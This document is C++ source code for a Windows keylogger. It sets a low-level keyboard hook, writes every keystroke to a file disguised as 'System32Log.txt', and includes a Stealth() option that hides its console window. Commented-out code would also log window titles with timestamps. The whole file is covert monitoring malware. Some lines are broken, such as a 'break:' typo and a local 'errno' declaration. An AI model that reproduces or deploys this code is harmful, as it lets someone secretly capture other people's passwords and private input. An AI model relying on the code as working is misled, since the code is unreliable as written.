#include <Windows.h>
#include <time.h>
#include <iostream>
#include <cstdio>

// defines whether the window is visible or not
// should be solved with makefile, not in this file
#define visible // (visible / invisible)

// variable to store the HANDLE to the hook. Don't declare it anywhere else then globally
// or you will get problems since every function uses this variable.
HHOOK _hook;

// This struct contains the data received by the hook callback. As you see in the callback function
// it contains the thing you will need: vkCode = virtual key code.
KBDLLHOOKSTRUCT kbdStruct;

int Save(int key_stroke, char *file);

extern char lastwindow[256];

// This is the callback function. Consider it the event that is raised when, in this case, 
// a key is pressed.
LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode >= 0) {
		// the action is valid: HC_ACTION.
		if (wParam == WM_KEYDOWN) {
			// lParam is the pointer to the struct containing the data needed, so cast and assign it to kdbStruct.
			kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
			// save to file
			Save(kbdStruct.vkCode, (char *) "System32Log.txt");
		}
	}
	// call the next hook in the hook chain. This is nessecary or your hook chain will break and the hook stops
	return CallNextHookEx(_hook, nCode, wParam, lParam);
}

void SetHook() {
	// Set the hook and set it to use the callback function above
	// WH_KEYBOARD_LL means it will set a low level keyboard hook. More information about it at MSDN.
	// The last 2 parameters are NULL, 0 because the callback function is in the same thread and window as the
	// function that sets and releases the hook.
	if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0))) {
		MessageBox(NULL, (LPCWSTR) "Failed to install hook!", (LPCWSTR) "Error", MB_ICONERROR);
	}
}

void ReleaseHook() {
	UnhookWindowsHookEx(_hook);
}

bool lowercase() {
	bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0); // check caps lock
																// check shift key
	if ((GetKeyState(VK_SHIFT) & 0x0001) != 0 || (GetKeyState(VK_LSHIFT) & 0x0001) != 0 || (GetKeyState(VK_RSHIFT) & 0x0001) != 0) {
		lowercase = !lowercase;
	}
	return lowercase;
}

int Save(int key_stroke, char *file) {
	char lastwindow[256];
	int errno;

	// ignore mouse clicks
	if ((key_stroke == 1) || (key_stroke == 2) ||  // VK_LBUTTON and VK_RBUTTON
		(key_stroke == 4) || (key_stroke == 5) || (key_stroke == 6))    // VK_MBUTTON, VK_XBUTTON1, and VK_XBUTTON2
		return 0;

	FILE *OUTPUT_FILE;
	errno = fopen_s(&OUTPUT_FILE, file, "a+");

	//HWND foreground = GetForegroundWindow();
	//if (foreground)	{
	//	char window_title[256];
	//	GetWindowText(foreground, (LPWSTR) window_title, 256);

	//	if (strcmp(window_title, lastwindow) != 0) {
	//		strcpy_s(lastwindow, sizeof(char)*256, window_title);

	//		// get time
	//		time_t t = time(NULL);
	//		struct tm tm;
	//		errno = localtime_s(&tm, &t);
	//		char s[64];
	//		strftime(s, sizeof(s), "%c", &tm);

	//		fprintf(OUTPUT_FILE, "\n\n[Window: %s - at %s] ", window_title, s);
	//	}
	//}

	std::cout << key_stroke << '\n';
	switch (key_stroke) {
	case VK_CANCEL: fprintf(OUTPUT_FILE, "%s", "[CTRLBREAK]");
		break;
	case VK_BACK: fprintf(OUTPUT_FILE, "%s", "[BACKSPACE]");
		break;
	case VK_TAB: fprintf(OUTPUT_FILE, "%s", "[TAB]");
		break;
	case VK_CLEAR: fprintf(OUTPUT_FILE, "%s", "[CLEAR]");
		break;
	case VK_RETURN: fprintf(OUTPUT_FILE, "%s", "[RETURN]\n");
		break;
	case VK_SHIFT: fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
		break;
	case VK_CONTROL: fprintf(OUTPUT_FILE, "%s", "[CONTROL]");
		break;
	case VK_MENU: fprintf(OUTPUT_FILE, "%s", "[ALT]");
		break;
	case VK_PAUSE: fprintf(OUTPUT_FILE, "%s", "[PAUSE]");
		break;
	case VK_CAPITAL: fprintf(OUTPUT_FILE, "%s", "[CAPSLOCK]");
		break;
	case VK_ESCAPE: fprintf(OUTPUT_FILE, "%s", "[ESCAPE]");
		break;
	case VK_SPACE: fprintf(OUTPUT_FILE, "%s", " ");
		break;
	case VK_PRIOR: fprintf(OUTPUT_FILE, "%s", "[PAGEUP]");
		break;
	case VK_NEXT: fprintf(OUTPUT_FILE, "%s", "[PAGEDOWN]");
		break;
	case VK_END: fprintf(OUTPUT_FILE, "%s", "[END]");
		break;
	case VK_HOME: fprintf(OUTPUT_FILE, "%s", "[HOME]");
		break;
	case VK_LEFT: fprintf(OUTPUT_FILE, "%s", "[LARROW]");
		break;
	case VK_UP: fprintf(OUTPUT_FILE, "%s", "[UPARROW]");
		break;
	case VK_RIGHT: fprintf(OUTPUT_FILE, "%s", "[RARROW]");
		break;
	case VK_DOWN: fprintf(OUTPUT_FILE, "%s", "[DOWNARROW]");
		break;
	case VK_SELECT: fprintf(OUTPUT_FILE, "%s", "[SELECT]");
		break;
	case VK_PRINT: fprintf(OUTPUT_FILE, "%s", "[PRINT]");
		break;
	case VK_EXECUTE: fprintf(OUTPUT_FILE, "%s", "[EXECUTE]");
		break;
	case VK_SNAPSHOT: fprintf(OUTPUT_FILE, "%s", "[PRINTSCREEN]");
		break;
	case VK_INSERT: fprintf(OUTPUT_FILE, "%s", "[INSERT]");
		break;
	case VK_DELETE: fprintf(OUTPUT_FILE, "%s", "[DELETE]");
		break;
	case VK_HELP: fprintf(OUTPUT_FILE, "%s", "[HELP]");
		break;
	// num and alpha
	case VK_LWIN: fprintf(OUTPUT_FILE, "%s", "[LWIN]");
		break;
	case VK_RWIN: fprintf(OUTPUT_FILE, "%s", "[RWIN]");
		break;
	case VK_APPS: fprintf(OUTPUT_FILE, "%s", "[APPS]");
		break;
	case VK_SLEEP: fprintf(OUTPUT_FILE, "%s", "[SLEEP]");
		break;
	//numpad
	case VK_MULTIPLY: fprintf(OUTPUT_FILE, "%s", "[NUM_MULTIPLY]");
		break;
	case VK_ADD: fprintf(OUTPUT_FILE, "%s", "[NUM_ADD]");
		break;
	case VK_SEPARATOR: fprintf(OUTPUT_FILE, "%s", "[NUM?SEPARATOR");
		break;
	case VK_DIVIDE: fprintf(OUTPUT_FILE, "%s", "[NUM_DIVIDE]");
		break;
	case VK_F1: fprintf(OUTPUT_FILE, "%s", "[F1]");
		break;
	case VK_F2: fprintf(OUTPUT_FILE, "%s", "[F2]");
		break;
	case VK_F3: fprintf(OUTPUT_FILE, "%s", "[F3]");
		break;
	case VK_F4: fprintf(OUTPUT_FILE, "%s", "[F4]");
		break;
	case VK_F5: fprintf(OUTPUT_FILE, "%s", "[F5]");
		break;
	case VK_F6: fprintf(OUTPUT_FILE, "%s", "[F6]");
		break;
	case VK_F7: fprintf(OUTPUT_FILE, "%s", "[F7]");
		break;
	case VK_F8: fprintf(OUTPUT_FILE, "%s", "[F8]");
		break;
	case VK_F9: fprintf(OUTPUT_FILE, "%s", "[F9]");
		break;
	case VK_F10: fprintf(OUTPUT_FILE, "%s", "[F10]");
		break;
	case VK_F11: fprintf(OUTPUT_FILE, "%s", "[F11]");
		break;
	case VK_F12: fprintf(OUTPUT_FILE, "%s", "[F12]");
		break;
	case VK_F13: fprintf(OUTPUT_FILE, "%s", "[F13]");
		break;
	case VK_F14: fprintf(OUTPUT_FILE, "%s", "[F14]");
		break;
	case VK_F15: fprintf(OUTPUT_FILE, "%s", "[F15]");
		break:
	case VK_F16: fprintf(OUTPUT_FILE, "%s", "[F16]");
		break;
	case VK_F17: fprintf(OUTPUT_FILE, "%s", "[F17]");
		break;
	case VK_F18: fprintf(OUTPUT_FILE, "%s", "[F18]");
		break;
	case VK_F19: fprintf(OUTPUT_FILE, "%s", "[F19]");
		break;
	case VK_F20: fprintf(OUTPUT_FILE, "%s", "[F20]");
		break;
	case VK_F21: fprintf(OUTPUT_FILE, "%s", "[F21]");
		break;
	case VK_F22: fprintf(OUTPUT_FILE, "%s", "[F22]");
		break;
	case VK_F23: fprintf(OUTPUT_FILE, "%s", "[F23]");
		break;
	case VK_F24: fprintf(OUTPUT_FILE, "%s", "[F24]");
		break;
	//
	case VK_NUMLOCK: fprintf(OUTPUT_FILE, "%s", "[NUMLOCK]");
		break;
	case VK_SCROLL: fprintf(OUTPUT_FILE, "%s", "[SCROLLLOCK]");
		break;
	//
	case VK_LSHIFT: fprintf(OUTPUT_FILE, "%s", "[LSHIFT]");
		break;
	case VK_RSHIFT: fprintf(OUTPUT_FILE, "%s", "[RSHIFT]");
		break;
	case VK_LCONTROL: fprintf(OUTPUT_FILE, "%s", "[LCONTROL]");
		break;
	case VK_RCONTROL: fprintf(OUTPUT_FILE, "%s", "[RCONTROL]");
		break;
	//case VK_LMENU: fprintf(OUTPUT_FILE, "%s", "[LMENU]");
	//	break;
	//case VK_RMENU: fprintf(OUTPUT_FILE, "%s", "[RMENU]");
	//	break;
	//case VK_BROWSER_BACK: fprintf(OUTPUT_FILE, "%s", "[BROWSER_BACK]");
	//	break;
	//case VK_BROWSER_FORWARD: fprintf(OUTPUT_FILE, "%s", "[BROWSER_FORWARD]");
	//	break;
	//case VK_BROWSER_REFRESH: fprintf(OUTPUT_FILE, "%s", "[BROWSER_REFRESH]");
	//	break;
	//case VK_BROWSER_STOP: fprintf(OUTPUT_FILE, "%s", "[BROWSER_STOP]");
	//	break;
	//case VK_BROWSER_SEARCH: fprintf(OUTPUT_FILE, "%s", "[BROWSER_SEARCH]");
	//	break;
	//case VK_BROWSER_FAVORITES: fprintf(OUTPUT_FILE, "%s", "[BROWSER_FAVORITES]");
	//	break;
	//case VK_BROWSER_HOME: fprintf(OUTPUT_FILE, "%s", "[BROWSER_HOME]");
	//	break;
	//case VK_VOLUME_MUTE: fprintf(OUTPUT_FILE, "%s", "[VOLUME_MUTE]");
	//	break;
	//case VK_VOLUME_DOWN: fprintf(OUTPUT_FILE, "%s", "[VOLUME_DOWN]");
	//	break;
	//case VK_VOLUME_UP: fprintf(OUTPUT_FILE, "%s", "[VOLUME_UP]");
	//	break;
	//case VK_MEDIA_NEXT_TRACK: fprintf(OUTPUT_FILE, "%s", "[MEDIA_NEXT_TRACK]");
	//	break;
	//case VK_MEDIA_PREV_TRACK: fprintf(OUTPUT_FILE, "%s", "[MEDIA_PREV_TRACK]");
	//	break;
	//case VK_MEDIA_STOP: fprintf(OUTPUT_FILE, "%s", "[MEDIA_STOP]");
	//	break;
	//case VK_MEDIA_PLAY_PAUSE: fprintf(OUTPUT_FILE, "%s", "[MEDIA_PLAY_PAUSE]");
	//	break;
	//case VK_LAUNCH_MAIL: fprintf(OUTPUT_FILE, "%s", "[LAUNCH_MAIL]");
	//	break;
	//case VK_LAUNCH_MEDIA_SELECT: fprintf(OUTPUT_FILE, "%s", "[LAUNCH_MEDIA_SELECT]");
	//	break;
	//case VK_LAUNCH_APP1: fprintf(OUTPUT_FILE, "%s", "[LAUNCH_APP1]");
	//	break;
	//case VK_LAUNCH_APP2: fprintf(OUTPUT_FILE, "%s", "[LAUNCH_APP2]");
	//	break;
	case VK_OEM_PLUS: fprintf(OUTPUT_FILE, "%s", "+");
		break;
	case VK_OEM_COMMA: fprintf(OUTPUT_FILE, "%s", ",");
		break;
	case VK_OEM_MINUS:
	case VK_SUBTRACT: fprintf(OUTPUT_FILE, "%s", "-");
		break;
	case VK_OEM_PERIOD:
	case VK_DECIMAL: fprintf(OUTPUT_FILE, "%s", ".");
		break;
	case VK_OEM_1:
		if (lowercase()) fprintf(OUTPUT_FILE, "%s", ";"); // US standard keyboard
		else fprintf(OUTPUT_FILE, "%s", ":");
		break;
	case VK_OEM_2:
		if (lowercase()) fprintf(OUTPUT_FILE, "%s", "/"); // US standard keyboard
		else fprintf(OUTPUT_FILE, "%s", "?");
		break;
	case VK_OEM_3:
		if (lowercase()) fprintf(OUTPUT_FILE, "%s", "`"); // US standard keyboard
		else fprintf(OUTPUT_FILE, "%s", "~");
		break;
	case VK_OEM_4:
		if (lowercase()) fprintf(OUTPUT_FILE, "%s", "["); // US standard keyboard
		else fprintf(OUTPUT_FILE, "%s", "{");
		break;
	case VK_OEM_5:
		if (lowercase()) fprintf(OUTPUT_FILE, "%s", "\\"); // US standard keyboard
		else fprintf(OUTPUT_FILE, "%s", "|");
		break;
	case VK_OEM_6:
		if (lowercase()) fprintf(OUTPUT_FILE, "%s", "]"); // US standard keyboard
		else fprintf(OUTPUT_FILE, "%s", "}");
		break;
	case VK_OEM_7:
		if (lowercase()) fprintf(OUTPUT_FILE, "%s", "'"); // US standard keyboard
		else fprintf(OUTPUT_FILE, "%s", "\"");
		break;
	default:
		if (key_stroke >= 96 && key_stroke <= 105) { // numpad numbers
			key_stroke -= 48;
		}
		else if (key_stroke >= 65 && key_stroke <= 90) { // A-Z
			if (lowercase()) key_stroke += 32;
		}
		fprintf(OUTPUT_FILE, "%c", key_stroke);
		break;
	}
	// NOTE: Numpad-Keys seem to print as lowercase letters

	fclose(OUTPUT_FILE);
	return 0;
}

void Stealth() {
#ifdef visible
	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1); // visible window
#endif // visible

#ifdef invisible
	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0); // invisible window
#endif // invisible
}

int main() {
	// visibility of window
	Stealth();

	// Set the hook
	SetHook();

	// loop to keep the console application running.
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0))
	{
	}
}
